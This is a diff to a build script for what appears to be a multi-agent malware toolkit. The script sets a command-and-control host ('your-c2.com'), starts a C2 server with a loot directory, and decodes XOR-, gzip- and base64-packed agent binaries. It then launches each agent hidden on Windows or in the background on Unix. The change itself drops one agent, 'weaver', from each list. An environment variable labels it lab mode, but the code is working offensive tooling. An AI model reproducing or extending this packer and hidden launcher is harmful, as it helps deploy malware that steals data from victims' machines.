@@ -28,7 +28,7 @@ OBFUSCATE=0
 COMPRESS=true
 C2_HOST="your-c2.com"
 C2_PORT=8444
-AGENTS=(queen worker drone honeybee weaver swarm c2-server)
+AGENTS=(queen worker drone honeybee swarm c2-server)
 
 while [[ $# -gt 0 ]]; do case "$1" in
     --windows)     TARGET_WIN=1; shift ;;
@@ -137,7 +137,7 @@ Get-ChildItem "$tmp\*.gz" | ForEach-Object {
 $env:__HIVE_ARENA = "hive_colony"; $env:HIVE_LAB_MODE = "1"
 if ($C2Host) { $env:HIVE_C2_URL = "http://${C2Host}:${C2Port}/collect" }
 Start-Process -WindowStyle Hidden "$tmp\c2-server.exe" -ArgumentList "--port $C2Port --loot-dir $tmp\loot --db-path $tmp\c2.db"
-foreach ($a in @('queen','worker','drone','honeybee','weaver')) {
+foreach ($a in @('queen','worker','drone','honeybee')) {
     $bin = "$tmp\$a.exe"
     if (Test-Path $bin) { Start-Process -WindowStyle Hidden $bin; Start-Sleep -Milliseconds 300 }
 }
@@ -167,7 +167,7 @@ EOF
 
     cat >> "$OUTPUT" << 'BASHEOF2'
 K=__XORKEY__; P=__PADDING__
-for agent in queen worker drone honeybee weaver swarm c2-server; do
+for agent in queen worker drone honeybee swarm c2-server; do
     data=$(decode_${agent})
     data=$(python3 -c "
 import sys, gzip, base64
@@ -186,7 +186,7 @@ for i in $(seq 1 15); do
     curl -sf "http://127.0.0.1:${C2_PORT}/health" > /dev/null 2>&1 && break
     sleep 1
 done
-for agent in queen worker drone honeybee weaver swarm; do
+for agent in queen worker drone honeybee swarm; do
     "${INSTALL_DIR}/${agent}" > /dev/null 2>&1 &
     sleep 0.3
 done
